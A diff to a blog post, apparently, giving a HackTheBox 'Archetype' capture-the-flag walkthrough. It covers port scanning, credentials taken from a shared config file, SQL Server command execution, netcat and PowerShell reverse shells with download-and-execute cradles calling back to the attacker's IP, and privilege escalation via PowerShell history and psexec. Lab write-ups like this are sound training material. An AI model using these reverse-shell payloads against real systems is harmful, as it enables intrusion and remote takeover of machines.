@@ -4,23 +4,25 @@ description: ""
 author: "Kyb3r"
 authorLink: "https://twitter.com/kyb3rvizsla"
 lightgallery: false
-date: 2021-08-17T12:00:01-05:00
-lastmod: 2021-08-17T12:00:01-05:00
+date: 2021-09-07T16:04:02-05:00
+lastmod: 2021-09-07T16:04:02-05:00
 resources:
 - name: "featured-image"
-  src: "featured-image.png"
+  src: "featured-image.jpeg"
 tags: [htb, writeup, hackthebox, ctf]
 categories: [writeup, hackthebox, ctf]
-draft: true
+draft: false
 ---
 Starting with the writeups, today we will launch the HackTheBox Archetype machine that belongs to the Starting Point group here the writeup.
 
 
-## Scan
+## Enumeration
+
+### Scan
 We'll start with a simple port scan with nmap:
 ```shell
 kyb3r@vizsla ~: nmap -sV -sC 10.10.10.27
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-17 14:34 CDT
+Starting Nmap 7 ( https://nmap.org )
 Nmap scan report for 10.10.10.27
 Host is up (0.10s latency).
 Not shown: 996 closed ports
@@ -75,7 +77,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 31.16 seconds
 ```
 
-## SQL Server
+### SQL Server
 We can notice that it contains a SQL Server which we are going to access with ```smbclient```.
 
 We will list the smb folders with:
@@ -111,7 +113,8 @@ The file prod.dtsConfig contains:
 </DTSConfiguration>
 ```
 
-### Mssqlclient
+## Foothold
+### mssqlclient
 
 The file contains some credentials which we will use with the impacket mssqlclient, if you use Kali Linux you can get it from ```/usr/share/doc/python3-impacket/examples/mssqlclient.py``` or you can download it from its [github](https://github.com/SecureAuthCorp/impacket) repo with:
 ```shell
@@ -165,14 +168,114 @@ SQL>
 ```
 ![xp_cmdshell](xp_cmdshell.png)
 
-## Reverse shell
+### Reverse shell
+
+#### with netcat (recomended)
+First obtain a copy of netcar for windows in case of using Kali/Parrot you can do it by executing:
+```shell
+cp /usr/share/windows-binaries/nc.exe .
+```
+Or you can download it from the official Kali [repository](https://gitlab.com/kalilinux/packages/windows-binaries).
+
+Then we will start an http server.
+
+with python3 (**recomended**):
+```
+python3 -m http.server
+```
+
+with python2:
+```
+python2 -m SimpleHTTPServer
+```
+
+Now put netcat in listening mode you can see how to do it in the part "[netcat in listening mode](#netcat-in-listening-mode)".
+
+```sql
+xp_cmdshell "powershell wget -UseBasicParsing http://YOUR IP/nc.exe -OutFile %temp%/nc.exe"
+```
+```sql
+xp_cmdshell "%temp%/nc.exe -nv YOUR IP 443 -e cmd.exe"
+```
+#### with powershell script
 Now we will create a file reverse shell with the extension ``.ps1`` for powershell here the code:
 ```powershell
 $client = New-Object System.Net.Sockets.TCPClient(“YOUR IP”,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + “# “;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 Remember change "Your IP" text for u Hack The Box VPN ip adress, example:
 ![Reverse Shell](reverse_shell.png)
-Then we will start an http server with python:
+Then we will start an http server.
+
+with python3 (**recomended**):
 ```
 python3 -m http.server
 ```
+
+with python2:
+```
+python2 -m SimpleHTTPServer
+```
+Now put netcat in listening mode you can see how to do it in the part "[netcat in listening mode](#netcat-in-listening-mode)".
+
+Then download that shell in SQL with the following command:
+```sql
+xp_cmdshell "powershell "IEX (New-Object
+Net.WebClient).DownloadString(\"http://YOUR IP/shell.ps1\");"
+```
+
+#### netcat in listening mode
+To have netcat in listening mode you must execute:
+![Netcat listering](netcat-listering.png)
+```shell
+ln -lvnp 443
+```
+{{< admonition type=tip title="Tip" open=true >}}
+If you have a firewall, you must disable it or add rules for ports 443 and 80 with the commands:
+
+```shell
+ufw allow from 10.10.10.27 proto tcp to any port 80,443
+```
+{{< /admonition >}}
+Now you can continue in the type of connection you chose.
+
+### User flag
+The user (ARCHETYPE/sql_svc) banner is on the desktop at home.
+
+## Privilege Escalation
+To obtain the administrator credentials we will exploit the history or log of the powershell this is located in the user's home in the path: ```C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt```
+
+To see the content of the file we execute:
+```cmd
+type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+
+### Root flag
+Login with administrator user with [psexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py).
+
+```shell
+python3 psexec.py administrator@10.10.10.27
+Impacket - Copyright SecureAuth Corpotation
+
+Password: 
+
+[*] Requesting shares on 10.10.10.27......
+[*] Found writable share ADMIN$
+[*] Uploading file uTkahtBM.exe
+[*] Opening SVCManager on 10.10.10.27......
+[*] Creating service uwOG on 10.10.10.27......
+[*] Starting service uwOG......
+[!] Press help for extra shel commands
+
+Microsoft Windows
+(C) Microsoft Coporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Windows\system32>
+```
+The admin banner is on the desktop at home.
+
+## Video
+
+[Comming soon...](https://www.youtube.com/channel/UCOJ5LhsjIFIB5k5IjHtJTGA)
